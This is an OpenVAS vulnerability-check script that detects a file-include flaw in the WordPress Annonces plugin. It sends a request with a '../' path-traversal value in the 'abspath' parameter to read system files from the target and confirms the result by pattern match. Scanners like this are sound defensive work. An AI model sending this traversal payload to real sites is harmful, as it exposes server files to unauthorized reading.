###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_49689.nasl 7577 2017-10-26 10:41:56Z cfischer $
#
# WordPress Annonces Plugin 'abspath' Parameter Remote File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The Annonces plug-in for WordPress is prone to a remote file-include
vulnerability because it fails to sufficiently sanitize user-
supplied input.

Exploiting this issue could allow an attacker to compromise the
application and the underlying system; other attacks are also
possible.

Annonces 1.2.0.0 is vulnerable; other versions may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103262";
CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
 script_oid(SCRIPT_OID);
 script_version("$Revision: 7577 $");
 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:41:56 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2011-09-20 13:31:33 +0200 (Tue, 20 Sep 2011)");
 script_bugtraq_id(49689);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_name("WordPress Annonces Plugin 'abspath' Parameter Remote File Include Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49689");
 script_xref(name : "URL" , value : "http://wordpress.org/extend/plugins/annonces/");
 script_xref(name : "URL" , value : "http://wordpress.org/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("wordpress/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("version_func.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) { 

  url = string(dir, "/wp-content/plugins/annonces/includes/lib/photo/uploadPhoto.php?mainPluginFile=/",files[file],"&abspath=../../../../../../"); 

  if(http_vuln_check(port:port, url:url,pattern:file)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
